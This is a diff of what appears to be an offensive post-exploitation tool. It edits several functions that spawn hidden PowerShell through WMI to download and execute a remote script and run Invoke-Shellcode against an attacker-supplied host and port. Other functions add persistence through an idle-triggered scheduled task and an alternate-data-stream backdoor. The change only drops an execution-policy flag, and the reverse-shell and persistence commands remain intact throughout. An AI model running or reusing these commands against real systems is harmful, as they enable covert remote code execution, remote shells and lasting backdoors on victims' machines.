@@ -220,7 +220,7 @@ Public Function Execute() As Variant
         Set objConfig = objStartup.SpawnInstance_
         objConfig.ShowWindow = HIDDEN_WINDOW
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
+        objProcess.Create "powershell.exe -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
      End Function
 
 Public Function WriteWrapper() As Variant
@@ -350,7 +350,7 @@ Public Function Execute() As Variant
         Set objConfig = objStartup.SpawnInstance_
         objConfig.ShowWindow = HIDDEN_WINDOW
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
+        objProcess.Create "powershell.exe -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
      End Function
 
 
@@ -363,7 +363,7 @@ Public Function Persist() As Variant
         Set objConfig = objStartup.SpawnInstance_
         objConfig.ShowWindow = HIDDEN_WINDOW
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-        objProcess.Create "Powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c Invoke-Command -ScriptBlock { schtasks /create  /TN $TaskName /TR 'powershell.exe -ep Bypass -WindowStyle hidden -noexit -c ''IEX ((New-Object Net.WebClient).DownloadString(''''$global:IS_Url''''''))''; Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force' /SC onidle /i $TimeDelay}", Null, objConfig, intProcessID
+        objProcess.Create "Powershell.exe -WindowStyle Hidden -nop -noexit -c Invoke-Command -ScriptBlock { schtasks /create  /TN $TaskName /TR 'powershell.exe -ep Bypass -WindowStyle hidden -noexit -c ''IEX ((New-Object Net.WebClient).DownloadString(''''$global:IS_Url''''''))''; Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force' /SC onidle /i $TimeDelay}", Null, objConfig, intProcessID
      End Function
 
 
@@ -446,7 +446,7 @@ Public Function Execute() As Variant
         Set objConfig = objStartup.SpawnInstance_
         objConfig.ShowWindow = HIDDEN_WINDOW
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
+        objProcess.Create "powershell.exe -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
      End Function
 	 
 Public Function ADSPersist() As Variant
@@ -458,7 +458,7 @@ Public Function ADSPersist() As Variant
         Set objConfig = objStartup.SpawnInstance_
         objConfig.ShowWindow = HIDDEN_WINDOW
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$AltDSURL')); Invoke-ADSBackdoor -URL $global:IS_Url -Arguments 'Invoke-Shellcode -Payload $Payload -LHost $global:IP -LPort $global:Port -Force'", Null, objConfig, intProcessID
+        objProcess.Create "powershell.exe -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$AltDSURL')); Invoke-ADSBackdoor -URL $global:IS_Url -Arguments 'Invoke-Shellcode -Payload $Payload -LHost $global:IP -LPort $global:Port -Force'", Null, objConfig, intProcessID
      End Function
 
 
